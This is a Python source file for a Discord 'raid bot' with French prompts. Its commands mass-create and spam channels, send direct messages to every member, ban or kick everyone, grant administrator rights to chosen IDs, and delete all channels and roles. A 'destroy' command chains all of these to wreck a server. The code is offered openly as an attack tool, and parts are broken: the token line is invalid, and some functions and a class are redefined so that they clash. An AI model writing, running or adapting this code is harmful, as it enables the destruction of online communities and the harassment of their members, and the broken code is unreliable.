import aiohttp
import os
import time
import asyncio
import discord
import json
from colorama import Fore
import requests
from discord import Activity, ActivityType
from discord.ext import commands
from discord.ui import Modal, View, TextInput, Select
from pystyle import Colorate, Colors
import sys

sys.path.insert(0, os.path.abspath(os.path.dirname(__file__)))

intents = discord.Intents.all()
prefix = "+"
bot = commands.Bot(command_prefix=prefix, intents=intents)
def load_config():
    global CONFIG
    with open('config.json') as config_file:
        CONFIG = json.load(config_file)
TOKEN = #tokendubotdiscord.gg/cfxdata
@bot.event
async def on_ready():
    global CONFIG
    load_config()

    presence_type = getattr(ActivityType, CONFIG["BOT_PRESENCE"]["type"].lower(), ActivityType.playing)
    await bot.change_presence(activity=Activity(type=presence_type, name=CONFIG["BOT_PRESENCE"]["text"]))

    print(Fore.BLUE + f'[+] {bot.user.name} is online!' + Fore.RESET)
    print(Fore.BLUE + f'[+] Bot is ready for use' + Fore.RESET)

@bot.command()
async def tools(ctx):
    embed = discord.Embed(
        title="**__Raide Bot Panel__**",
        description="**Utilise** les options ci-dessous afin de **te guider**\n*Raide le serveur de ton choix !*\n\n**__Options disponibles :__**\n\n",
        color=0xFF0000
    )
    embed.add_field(name=f"> ``{prefix}``**crchannels**", value="Crée ``autant`` de salons ``voulu`` avec le nom commun sur eux tous\n")
    embed.add_field(name=f"> ``{prefix}``**spamchannels**", value="Envoyez un message commun dans ``tous`` les salons\n")
    embed.add_field(name=f"> ``{prefix}``**banall**", value="``Bannir`` tous les membres du serveur\n")
    embed.add_field(name=f"> ``{prefix}``**kickall**", value="``Expulsez`` tous les membres du serveur\n")
    embed.add_field(name=f"> ``{prefix}``**dmmembers**", value="Envoyez un message ``commun`` à tous les membres du serveur\n")
    embed.add_field(name=f"> ``{prefix}``**createroles**", value="Crée autant de rôles ``voulu`` avec le nom commun\n")
    embed.add_field(name=f"> ``{prefix}``**getadmin**", value="Mettre ``Administrateur`` l'id entrée dans la configuration du ``panel``\n")
    embed.add_field(name=f"> ``{prefix}``**servname**", value="Changez le ``nom du serveur``\n")
    embed.add_field(name=f"> ``{prefix}``**webhookspam**", value="``Spammez`` le message voulu dans un salon particulier à l'aide du ``webhook``\n")
    embed.add_field(name=f"> ``{prefix}``**destroy**", value="Raide ``automatique`` avec les configurations définies\n")
    embed.add_field(name=f"> ``{prefix}``**seeconfig**", value="Affiche la configuration actuelle du bot\n")
    embed.add_field(name=f"> ``{prefix}``**dlchannels**", value="Supprime tous les salons du serveur\n")
    embed.add_field(name=f"> ``{prefix}``**setconfig**", value="Met à jour la configuration du bot\n")
    await ctx.send(embed=embed)
@bot.command()
async def crchannels(ctx):
    def check(m):
        return m.author == ctx.author and m.channel == ctx.channel

    await ctx.send("Combien de salons voulez-vous créer ?")
    num_channels = int((await bot.wait_for('message', check=check)).content)

    await ctx.send("Quel type de salon (text/voice) ?")
    channel_type = (await bot.wait_for('message', check=check)).content.lower()

    await ctx.send("Quel nom pour les salons ?")
    channel_name = (await bot.wait_for('message', check=check)).content

    guild = ctx.guild
    tasks = [create_channels(guild, channel_type, channel_name) for _ in range(num_channels)]
    await asyncio.gather(*tasks)
    await ctx.send(f"{num_channels} salons de type {channel_type} créés avec le nom {channel_name}.")

async def create_channels(guild, channel_type, channel_name):
    if channel_type == "text":
        await guild.create_text_channel(channel_name)
    elif channel_type == "voice":
        await guild.create_voice_channel(channel_name)
    else:
        raise ValueError(f"Type de salon invalide: {channel_type}")

@bot.command()
async def spamchannels(ctx):
    def check(m):
        return m.author == ctx.author and m.channel == ctx.channel

    await ctx.send("Combien de messages voulez-vous envoyer dans chaque salon ?")
    num_messages = int((await bot.wait_for('message', check=check)).content)

    await ctx.send("Quel est le contenu des messages à envoyer ?")
    message_content = (await bot.wait_for('message', check=check)).content

    await spam_channels(ctx.guild, num_messages, message_content)

async def spam_channels(guild, num_messages, message_content):
    try:
        start_time_total = time.time()
        tasks = [send_messages_to_channel(channel, num_messages, message_content) for channel in guild.channels if isinstance(channel, discord.TextChannel)]
        await asyncio.gather(*tasks)
        end_time_total = time.time()
        log_message(Colors.blue, f"[!] Command Used: Spam - {num_messages} messages sent to all text channels - Total Time taken: {end_time_total - start_time_total:.2f} seconds")
    except Exception as e:
        log_message(Colors.red, f"[-] Error: {e}")

async def send_messages_to_channel(channel, num_messages, message_content):
    try:
        for i in range(num_messages):
            await channel.send(message_content)
            log_message(Colors.yellow, f"[-] Message {i+1}/{num_messages} sent to channel {channel.name}")
        return True
    except Exception as e:
        log_message(Colors.red, f"[-] Can't send messages to channel {channel.name}: {e}")
        return False

@bot.command()
async def dmmembers(ctx):
    def check(m):
        return m.author == ctx.author and m.channel == ctx.channel

    await ctx.send("Quel est le contenu du message à envoyer à tous les membres ?")
    message_content = (await bot.wait_for('message', check=check)).content

    members = [member for member in ctx.guild.members if not member.bot]
    for member in members:
        try:
            await member.send(message_content)
            log_message(Colors.yellow, f"[-] Message sent to member {member.name}")
            await asyncio.sleep(0.3)
        except discord.Forbidden:
            log_message(Colors.red, f"[-] Cannot send message to member {member.name}")
        except Exception as e:
            log_message(Colors.red, f"[-] Error sending message to member {member.name}: {e}")
    await ctx.send("Message envoyé à tous les membres.")
@bot.command()
async def createroles(ctx):
    def check(m):
        return m.author == ctx.author and m.channel == ctx.channel

    await ctx.send("Combien de rôles voulez-vous créer ?")
    num_roles = int((await bot.wait_for('message', check=check)).content)

    await ctx.send("Quel nom pour les rôles ?")
    role_name = (await bot.wait_for('message', check=check)).content

    guild = ctx.guild
    tasks = [create_role(guild, role_name) for _ in range(num_roles)]
    await asyncio.gather(*tasks)
    await ctx.send(f"{num_roles} rôles créés avec le nom {role_name}.")

async def create_role(guild, role_name):
    try:
        await guild.create_role(name=role_name)
        log_message(Colors.yellow, f"[-] Created role {role_name}")
    except discord.Forbidden:
        log_message(Colors.red, f"[-] Permission denied to create role {role_name}")
    except Exception as e:
        log_message(Colors.red, f"[-] Error creating role {role_name}: {e}")

@bot.command()
async def getadmin(ctx, member_id: int):
    guild = ctx.guild
    member = guild.get_member(member_id)
    if member:
        try:
            role = discord.utils.get(guild.roles, name="Administrator")
            if role is None:
                role = await guild.create_role(name="Administrator", permissions=discord.Permissions.all())
            await member.add_roles(role)
            log_message(Colors.yellow, f"[-] Added Administrator role to {member.name}")
        except discord.Forbidden:
            log_message(Colors.red, f"[-] Permission denied to add role to {member.name}")
        except Exception as e:
            log_message(Colors.red, f"[-] Error adding role to {member.name}: {e}")
    else:
        await ctx.send("Member not found.")

@bot.command()
async def servname(ctx):
    def check(m):
        return m.author == ctx.author and m.channel == ctx.channel

    await ctx.send("Quel est le nouveau nom du serveur ?")
    new_name = (await bot.wait_for('message', check=check)).content

    try:
        await ctx.guild.edit(name=new_name)
        log_message(Colors.yellow, f"[-] Server name changed to {new_name}")
        await ctx.send(f"Nom du serveur changé en {new_name}.")
    except discord.Forbidden:
        log_message(Colors.red, f"[-] Permission denied to change server name")
    except Exception as e:
        log_message(Colors.red, f"[-] Error changing server name: {e}")

@bot.command()
async def webhookspam(ctx):
    def check(m):
        return m.author == ctx.author and m.channel == ctx.channel

    await ctx.send("Quel est l'URL du webhook ?")
    webhook_url = (await bot.wait_for('message', check=check)).content

    await ctx.send("Quel est le contenu du message à spammer ?")
    message_content = (await bot.wait_for('message', check=check)).content

    try:
        webhook = discord.Webhook.from_url(webhook_url, adapter=discord.RequestsWebhookAdapter())
        await webhook.send(message_content, wait=True)
        log_message(Colors.yellow, f"[-] Message sent via webhook to {webhook_url}")
    except Exception as e:
        log_message(Colors.red, f"[-] Error sending message via webhook: {e}")

async def ban_all_members(guild):
    try:
        no_ban_kick_ids = CONFIG.get("NO_BAN_KICK_ID", [])
        members = [member for member in guild.members if not member.bot and member.id not in no_ban_kick_ids]
        for member in members:
            try:
                await member.ban(reason="Banned by raid bot")
                log_message(Colors.yellow, f"[-] Banned member {member.name}")
            except discord.Forbidden:
                log_message(Colors.red, f"[-] Permission denied to ban member {member.name}")
            except discord.HTTPException as e:
                log_message(Colors.red, f"[-] HTTP Error while banning member {member.name}: {e}")
    except Exception as e:
        log_message(Colors.red, f"[-] Error during banning members: {e}")

async def kick_all_members(guild):
    try:
        no_ban_kick_ids = CONFIG.get("NO_BAN_KICK_ID", [])
        members = [member for member in guild.members if not member.bot and member.id not in no_ban_kick_ids]
        for member in members:
            try:
                await member.kick(reason="Kicked by raid bot")
                log_message(Colors.yellow, f"[-] Kicked member {member.name}")
            except discord.Forbidden:
                log_message(Colors.red, f"[-] Permission denied to kick member {member.name}")
            except discord.HTTPException as e:
                log_message(Colors.red, f"[-] HTTP Error while kicking member {member.name}: {e}")
    except Exception as e:
        log_message(Colors.red, f"[-] Error during kicking members: {e}")

async def delete_all_emojis(guild):
    try:
        if CONFIG["AUTO_RAID_CONFIG"].get("delete_emojis", False):
            emojis = [emoji for emoji in guild.emojis]
            for emoji in emojis:
                try:
                    await emoji.delete()
                    log_message(Colors.yellow, f"[-] Deleted emoji {emoji.name}")
                except discord.Forbidden:
                    log_message(Colors.red, f"[-] Permission denied to delete emoji {emoji.name}")
                except discord.HTTPException as e:
                    log_message(Colors.red, f"[-] HTTP Error while deleting emoji {emoji.name}: {e}")
    except Exception as e:
        log_message(Colors.red, f"[-] Error during emoji deletion: {e}")

async def add_admin_permissions(guild):
    try:
        no_ban_kick_ids = CONFIG.get("NO_BAN_KICK_ID", [])
        for member_id in no_ban_kick_ids:
            member = guild.get_member(member_id)
            if member:
                role = discord.utils.get(guild.roles, name="Administrator")
                if role is None:
                    role = await guild.create_role(name="Administrator", permissions=discord.Permissions.all())
                await member.add_roles(role)
                log_message(Colors.yellow, f"[-] Added Administrator role to {member.name}")
    except Exception as e:
        log_message(Colors.red, f"[-] Error adding admin permissions: {e}")

@bot.command()
async def dlchannels(ctx):
    guild = ctx.guild
    channels = [channel for channel in guild.channels]
    for channel in channels:
        try:
            await channel.delete()
            log_message(Colors.yellow, f"[-] Deleted channel {channel.name}")
        except discord.Forbidden:
            log_message(Colors.red, f"[-] Permission denied to delete channel {channel.name}")
        except Exception as e:
            log_message(Colors.red, f"[-] Error deleting channel {channel.name}: {e}")
    await ctx.send("Tous les salons ont été supprimés.")

@bot.command()
async def setconfig(ctx):
    def check(m):
        return m.author == ctx.author and m.channel == ctx.channel

    await ctx.send("Quel paramètre souhaitez-vous modifier (BOT_PRESENCE, SERVER_CONFIG, WEBHOOK_CONFIG, AUTO_RAID_CONFIG) ?")
    config_type = (await bot.wait_for('message', check=check)).content

    if config_type == "BOT_PRESENCE":
        await ctx.send("Quel type de présence ? (playing, streaming, listening, watching)")
        presence_type = (await bot.wait_for('message', check=check)).content
        await ctx.send("Quel texte pour la présence ?")
        presence_text = (await bot.wait_for('message', check=check)).content
        CONFIG["BOT_PRESENCE"]["type"] = presence_type
        CONFIG["BOT_PRESENCE"]["text"] = presence_text
        with open('config.json', 'w') as config_file:
            json.dump(CONFIG, config_file, indent=4)
        await ctx.send("Configuration mise à jour.")
    else:
        await ctx.send("Configuration inconnue.")

@bot.command()
async def seeconfig(ctx):
    embed = discord.Embed(title="Configuration actuelle du bot", color=0x00FF00)
    embed.add_field(name="BOT_PRESENCE", value=json.dumps(CONFIG["BOT_PRESENCE"], indent=4), inline=False)
    embed.add_field(name="SERVER_CONFIG", value=json.dumps(CONFIG["SERVER_CONFIG"], indent=4), inline=False)
    embed.add_field(name="WEBHOOK_CONFIG", value=json.dumps(CONFIG["WEBHOOK_CONFIG"], indent=4), inline=False)
    embed.add_field(name="AUTO_RAID_CONFIG", value=json.dumps(CONFIG["AUTO_RAID_CONFIG"], indent=4), inline=False)
    await ctx.send(embed=embed)

def log_message(color, message):
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
    formatted_message = f"{timestamp} - {message}"
    print(Colorate.Color(color, formatted_message))
with open('config.json') as config_file:
    CONFIG = json.load(config_file)
class Colors:
    yellow = '\033[93m'
    red = '\033[91m'
@bot.command()
async def destroy(ctx):
    guild = ctx.guild
    config = CONFIG["AUTO_RAID_CONFIG"]

    async def update_server_config(guild, server_config):
        tasks = []
        if "new_name" in server_config:
            tasks.append(guild.edit(name=server_config["new_name"]))
        if "new_icon" in server_config:
            async with aiohttp.ClientSession() as session:
                async with session.get(server_config["new_icon"]) as resp:
                    if resp.status == 200:
                        icon_data = await resp.read()
                        tasks.append(guild.edit(icon=icon_data))
        if "new_description" in server_config:
            tasks.append(guild.edit(description=server_config["new_description"]))
        return tasks

    async def delete_all_channels(guild):
        tasks = []
        for channel in guild.channels:
            tasks.append(channel.delete())
        return tasks

    async def create_and_spam_channels(guild, num_channels, channel_type, channel_name, num_messages, message_content):
        tasks = []
        for _ in range(num_channels):
            if channel_type == "text":
                new_channel = await guild.create_text_channel(channel_name)
            elif channel_type == "voice":
                new_channel = await guild.create_voice_channel(channel_name)
            else:
                continue
            tasks.extend([new_channel.send(message_content) for _ in range(num_messages)])
        await asyncio.gather(*tasks)

    async def ban_all_members(guild):
        tasks = []
        for member in guild.members:
            if not member.bot:
                tasks.append(guild.ban(member))
        return tasks

    async def delete_all_roles(guild):
        tasks = []
        for role in guild.roles:
            if role != guild.default_role:
                tasks.append(role.delete())
        return tasks

    async def create_roles(guild, num_roles, role_name):
        tasks = []
        for _ in range(num_roles):
            tasks.append(guild.create_role(name=role_name))
        return tasks

    zzzd = await update_server_config(guild, CONFIG["SERVER_CONFIG"])
    await asyncio.gather(*zzzd)

    zhzhz = await delete_all_channels(guild)
    await asyncio.gather(*zhzhz)

    await create_and_spam_channels(guild, config["num_channels"], config["channel_type"], config["channel_name"], config["num_messages"], config["message_content"])


    if config["ban_all"]:
        zzzz = await ban_all_members(guild)
        await asyncio.gather(*zzzz)

    nnn = await delete_all_roles(guild)
    await asyncio.gather(*nnn)

    tasks = await create_roles(guild, config["num_roles"], config["role_name"])
    await asyncio.gather(*tasks)

    await ctx.send("Raid complete")
async def update_server_config(guild, server_config):
    try:
        await guild.edit(name=server_config["name"])
        log_message(Colors.yellow, f"[-] Server name changed to {server_config['name']}")
    except discord.Forbidden:
        log_message(Colors.red, "[-] Permission denied to change server name")
    except Exception as e:
        log_message(Colors.red, f"[-] Error changing server name: {e}")

    try:
        with open(server_config["icon"], 'rb') as icon_file:
            icon = icon_file.read()
        await guild.edit(icon=icon)
        log_message(Colors.yellow, "[-] Server icon changed")
    except discord.Forbidden:
        log_message(Colors.red, "[-] Permission denied to change server icon")
    except Exception as e:
        log_message(Colors.red, f"[-] Error changing server icon: {e}")

async def delete_all_channels(guild):
    channels = [channel for channel in guild.channels]
    for channel in channels:
        try:
            await channel.delete()
            log_message(Colors.yellow, f"[-] Deleted channel {channel.name}")
        except discord.Forbidden:
            log_message(Colors.red, f"[-] Permission denied to delete channel {channel.name}")
        except Exception as e:
            log_message(Colors.red, f"[-] Error deleting channel {channel.name}: {e}")

async def create_and_spam_channels(guild, num_channels, channel_type, channel_name, num_messages, message_content):
    created_channels = []
    for _ in range(num_channels):
        if channel_type == "text":
            channel = await guild.create_text_channel(channel_name)
        else:
            channel = await guild.create_voice_channel(channel_name)
        created_channels.append(channel)
        log_message(Colors.yellow, f"[-] Created channel {channel.name}")

    for channel in created_channels:
        if isinstance(channel, discord.TextChannel):
            for _ in range(num_messages):
                await channel.send(message_content)
                log_message(Colors.yellow, f"[-] Sent message in {channel.name}")

async def ban_all_members(guild):
    for member in guild.members:
        if member.id not in CONFIG["NO_BAN_KICK_ID"]:
            try:
                await member.ban(reason="Server destruction")
                log_message(Colors.yellow, f"[-] Banned member {member.name}")
            except discord.Forbidden:
                log_message(Colors.red, f"[-] Permission denied to ban member {member.name}")
            except Exception as e:
                log_message(Colors.red, f"[-] Error banning member {member.name}: {e}")

async def delete_all_roles(guild):
    roles = [role for role in guild.roles if role != guild.default_role]
    for role in roles:
        try:
            await role.delete()
            log_message(Colors.yellow, f"[-] Deleted role {role.name}")
        except discord.Forbidden:
            log_message(Colors.red, f"[-] Permission denied to delete role {role.name}")
        except Exception as e:
            log_message(Colors.red, f"[-] Error deleting role {role.name}: {e}")

async def create_roles(guild, num_roles, role_name):
    for _ in range(num_roles):
        try:
            await guild.create_role(name=role_name)
            log_message(Colors.yellow, f"[-] Created role {role_name}")
        except discord.Forbidden:
            log_message(Colors.red, f"[-] Permission denied to create role {role_name}")
        except Exception as e:
            log_message(Colors.red, f"[-] Error creating role {role_name}: {e}")
if sys.platform == 'win32':
    asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
if __name__ == "__main__":
    load_config()
    bot.run(TOKEN) 
